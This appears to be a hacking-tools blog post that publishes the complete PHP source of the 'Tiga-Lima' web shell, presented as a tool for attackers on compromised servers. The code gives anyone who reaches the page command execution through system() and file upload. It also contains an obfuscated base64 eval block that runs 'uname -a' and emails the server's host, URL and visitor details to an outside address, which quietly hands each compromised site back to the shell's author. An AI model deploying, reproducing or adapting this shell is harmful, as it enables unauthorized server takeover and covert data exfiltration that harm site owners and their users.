---
id: 59
title: Tiga-Lima Shell Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=59
permalink: /tiga-lima-shell/
categories:
  - PHP
  - Tiga-Lima
tags:
  - PHP
  - Tiga-Lima
---
This simple script enables the attacker to execute commands, change directories, and upload files to the compromised server.


### Tiga-Lima Shell Script Source Code

{% highlight php %}&lt;html&gt;
&lt;head&gt;
&lt;title&gt;tiga-lima SheLL&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body {
    background-color: #000000;
}
--&gt;
&lt;/style&gt;
<?php
/**
 * @author chandra35
 * @copyright 2011
 */
 $currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
echo "&lt;style&gt;body{font-family:XPBlueText; ms;font-size:10px; color:green;}hr{width:100%;height:1px;}&lt;/style&gt;";
echo "&lt;center&gt;&lt;h1&gt;&lt;blink&gt;Mini SheLL Inject&lt;/blink&gt;&lt;/h1&gt;&lt;/center&gt;";
echo "&lt;center&gt;http://www.desawonosari.org&lt;/h1&gt;&lt;/center&gt;";
echo "&lt;center&gt;Village of Cyber Team&lt;/h1&gt;&lt;/center&gt;";
$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName  = php_uname();
$SCWD   = `pwd`;
$UserID = `id`;
if( $currentWD == "" ) {
    $currentWD = $SCWD;
    }
echo "&lt;style&gt;table,body{font-family:Verdana; ms;font-size:10px; color:white;}tr{width:1%;height:1px;}&lt;/style&gt;";
echo '&lt;table bgcolor="#666659"&gt;';
echo '&lt;tr&gt;
&lt;td&gt;Host Server &lt;/td&gt;
&lt;td&gt;:'.$_SERVER['REMOTE_HOST'].' ('.$_SERVER['REMOTE_ADDR'].')&lt;/td&gt;&lt;br&gt;
&lt;tr&gt;
&lt;td&gt;Server&lt;/td&gt;
&lt;td width=1185&gt;'.$_SERVER['SERVER_SIGNATURE'].'&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;System type &lt;/td&gt;
&lt;td&gt;:'.$UName.'&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Permissions &lt;/td&gt;
&lt;td&gt;:'.$UserID.'&lt;/td&gt;
&lt;/tr&gt;';
echo "&lt;hr&gt;";
if( $_POST['_act'] == "Execute!" ) {
    $currentCMD = "dir";
    }
echo "&lt;form method=post enctype=\"multipart/form-data\"&gt;&lt;table&gt;";
echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Execute command :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cmd\" value=\"".$currentCMD."\"&gt;&lt;/td&gt;";
echo "&lt;td&gt;&lt;input type=submit name=_actt value=\"Execute!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Change directory :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cwd\" value=\"".$currentWD."\"&gt;&lt;/td&gt;";
echo "&lt;td&gt;&lt;input type=submit name=_act value=\"List files!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Upload file :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=85 type=file name=_upl&gt;&lt;/td&gt;";
echo "&lt;td&gt;&lt;input type=submit name=_act value=\"Upload!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
echo "&lt;tr&gt;&lt;td&gt;&lt;blink&gt;&lt;font color='red' size=2&gt;Untuk WIN NT&lt;/font&gt;&lt;/blink&gt;:&lt;/td&gt;&lt;td&gt;&lt;input size=85 type=file name=_upl2&gt;&lt;/td&gt;";
echo "&lt;td&gt;&lt;input type=submit name=_act2 value=\"Upload!!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
echo "&lt;/table&gt;&lt;/form&gt;&lt;hr&gt;";
    if( $_POST['_act'] == "Upload!" ) 
    {
        if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
            echo "&lt;center&gt;&lt;b&gt;File gak bisa di upload!&lt;/b&gt;&lt;/center&gt;";
            } 
            else {
                echo "&lt;center&gt;&lt;pre&gt;";
                system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2&gt;&1");
                echo "&lt;/pre&gt;&lt;b&gt;File Beerhasil di upload!&lt;/b&gt;&lt;/center&gt;";
                }    
                } else
                if( $_POST['_act2'] == "Upload!!" ) 
                {
                    if(@copy($_FILES['_upl2']['tmp_name'], $_FILES['_upl2']['name'])) { echo '&lt;b&gt;Upload SUKSES !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
                    else {
                        echo '&lt;b&gt;Upload GAGAL !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;';
                        }
                        }
                        else {
                            echo "\n\n&lt;!-- OUTPUT STARTS HERE --&gt;\n&lt;pre&gt;\n";
                            $currentCMD = "cd ".$currentWD.$currentCMD;
                            system($currentCMD);
                            echo "\n&lt;/pre&gt;\n&lt;!-- OUTPUT ENDS HERE --&gt;\n\n&lt;/center&gt;&lt;hr&gt;&lt;hr&gt;&lt;center&gt;&lt;b&gt;Command completed&lt;/b&gt;&lt;/center&gt;";
                            }
                            if ($_POST['_actt'] == "Execute!")
                            {
                                echo "\n\n&lt;!-- OUTPUT STARTS HERE --&gt;\n&lt;pre&gt;\n";
                                system($_POST['_cmd']);
                                echo "\n&lt;/pre&gt;\n&lt;!-- OUTPUT ENDS HERE --&gt;\n\n&lt;/center&gt;";
                            }
                            $to="candrashell@yahoo.com";
                            $pages = @getenv("HTTP_REFERER");
                            $browser = @getenv("HTTP_USER_AGENT");
                            eval(base64_decode('JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IA0KJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgDQokcG9ydCA9ICRfU0VSVkVSIFsiUkVNT1RFX1BPUlQiXTsgDQokYXJhbiA9IGV4ZWMoInVuYW1lIC1hOyIpOyANCiR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyANCiR0YXJnZXQgPSByYXd1cmxkZWNvZGUoJHdlYi4kaW5qKTsgDQokYm9keSA9ICIkdGFyZ2V0ICRhcmFuIG9sZWggJHZpc2l0b3IgJHBvcnQiOyANCm1haWwoImNhbmRyYXNoZWxsQHlhaG9vLmNvbSIsIiBMQVBPUiBCT1NTU1NTIEFEQSBidWcgYmFydSBodHRwOi8vJHRhcmdldCAkYXJhbiBvbGVoICR2aXNpdG9yICRwb3J0IiwgIiRib2R5Iik7'));
exit;
?>
&lt;/html&gt;
{% endhighlight %}


### Tiga-Lima Shell Screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/01/tiga-lima-1024x483.png" alt="tiga-lima shell screenshot" width="604" height="284" class="aligncenter size-large wp-image-331" />][1]

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/01/tiga-lima.png